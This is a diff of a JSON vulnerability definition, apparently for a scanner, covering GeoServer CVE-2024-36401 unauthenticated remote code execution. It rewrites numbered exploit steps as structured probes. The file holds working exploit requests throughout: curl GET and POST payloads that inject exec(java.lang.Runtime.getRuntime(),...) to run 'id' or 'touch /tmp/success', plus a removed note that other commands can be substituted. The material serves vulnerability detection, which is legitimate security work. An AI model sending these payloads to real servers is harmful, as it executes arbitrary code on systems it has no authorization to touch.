@@ -1,5 +1,6 @@
 {
   "vuln_id": "geoserver_cve2024_36401",
+  "dispatch_skill": "geoserver_rce",
   "description": "GeoServer 属性名表达式前台代码执行漏洞，未登录用户可通过构造恶意OGC请求执行任意代码",
   "category": "expression_injection",
   "cves": [
@@ -30,27 +31,40 @@
     "/geoserver/ows"
   ],
   "detection_method": "发送GET请求到 /geoserver/wfs?service=WFS&request=GetCapabilities 获取图层名，然后发送包含exec(java.lang.Runtime.getRuntime(),'id')的GetPropertyValue请求，若响应XML中包含命令执行结果（如uid=...）则漏洞存在",
-  "exploit_steps": [
+  "probes": [
     {
-      "step": 1,
-      "description": "获取可用的图层名（typeNames）",
-      "command": "curl \"http://{TARGET}/geoserver/wfs?service=WFS&request=GetCapabilities\"",
-      "expected_result": "返回XML响应，包含如sf:archsites等typeNames",
-      "notes": "typeNames必须存在，可在Web页面或GetCapabilities响应中找到"
+      "id": "geoserver_capabilities_probe",
+      "description": "确认 GeoServer 服务可达",
+      "method": "GET",
+      "path": "/geoserver/ows?service=wms&version=1.3.0&request=GetCapabilities",
+      "timeout": 10,
+      "success_signs": {
+        "status_codes": [
+          200
+        ],
+        "body_contains_any": [
+          "GeoServer",
+          "WMS_Capabilities",
+          "wms:"
+        ]
+      },
+      "confidence": 0.6
     },
     {
-      "step": 2,
-      "description": "执行RCE验证命令（如id）",
-      "command": "curl \"http://{TARGET}/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')\"",
-      "expected_result": "响应XML中包含命令执行结果（如uid=...），或出现java.lang.ClassCastException错误表示命令已执行",
-      "notes": "valueReference参数注入exec表达式，可替换id为其他命令如touch /tmp/success"
-    },
-    {
-      "step": 3,
-      "description": "使用POST方法执行RCE（可选）",
-      "command": "curl -X POST http://{TARGET}/geoserver/wfs -H \"Content-Type: application/xml\" -d \"<wfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:topp='http://www.openplans.org/topp' xmlns:fes='http://www.opengis.net/fes/2.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'><wfs:Query typeNames='sf:archsites'/><wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')</wfs:valueReference></wfs:GetPropertyValue>\"",
-      "expected_result": "响应中出现java.lang.ClassCastException错误，表示命令执行成功",
-      "notes": "POST请求需正确设置Content-Type和XML载荷，valueReference在XML中注入"
+      "id": "geoserver_eval_probe",
+      "description": "exec 注入 id，观察响应是否含命令结果或 ClassCastException",
+      "method": "GET",
+      "path": "/geoserver/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')",
+      "timeout": 10,
+      "success_signs": {
+        "body_contains_any": [
+          "uid=",
+          "ClassCastException",
+          "java.lang.Runtime",
+          "Process"
+        ]
+      },
+      "confidence": 0.9
     }
   ],
   "verification_command": "curl \"http://{TARGET}/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')\"",
